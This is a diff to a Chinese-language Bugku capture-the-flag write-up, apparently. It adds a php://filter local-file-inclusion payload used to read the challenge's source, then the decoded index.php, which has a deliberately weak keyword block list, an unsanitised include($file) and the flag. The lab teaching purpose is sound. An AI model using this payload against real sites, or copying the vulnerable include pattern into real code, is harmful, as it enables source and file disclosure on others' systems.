@@ -263,7 +263,23 @@ document.getElementById("levelQuest").onsubmit=checkSubmit;
 点击后会在 URL 后面加 file=show.php 
 想到 php://filter 
 构造 payload:`?file=php://filter/read=convert.base64-encode/resource=index.php`
-得到 Base64 加密的in
+得到 Base64 加密的 index.php 源码,Base64 解码得到
+```php
+<html>      
+	<title>Bugku-ctf</title>        
+	<?php   
+	error_reporting(0);   
+	if(!$_GET[file]){
+	echo '<a href="./index.php?file=show.php">click me? no</a>';}   
+	$file=$_GET['file'];   
+	if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
+	    echo "Oh no!";    
+	    exit();
+    }   
+    include($file);   			
+    //flag:flag{edulcni_elif_lacol_si_siht}  ?> 
+     </html>  
+```
 
 ## 求 Getshell
 后缀名黑名单检测和类型检测
@@ -272,7 +288,7 @@ document.getElementById("levelQuest").onsubmit=checkSubmit;
 ![](https://upload-images.jianshu.io/upload_images/9172841-0b4859adfbdad510.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/702/format/webp)
 
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbOTMxMTQ0MDYzLDE0MDMyMzcxODEsMTY1NT
-c4MTUzLDQ4NDUzOTc4MSwtMTIxOTA1NTAzOSwtMTc0NTA5MjYy
-OCwtNDI4NzI1ODA0XX0=
+eyJoaXN0b3J5IjpbLTcwNDk0MTk2NiwxNDAzMjM3MTgxLDE2NT
+U3ODE1Myw0ODQ1Mzk3ODEsLTEyMTkwNTUwMzksLTE3NDUwOTI2
+MjgsLTQyODcyNTgwNF19
 -->
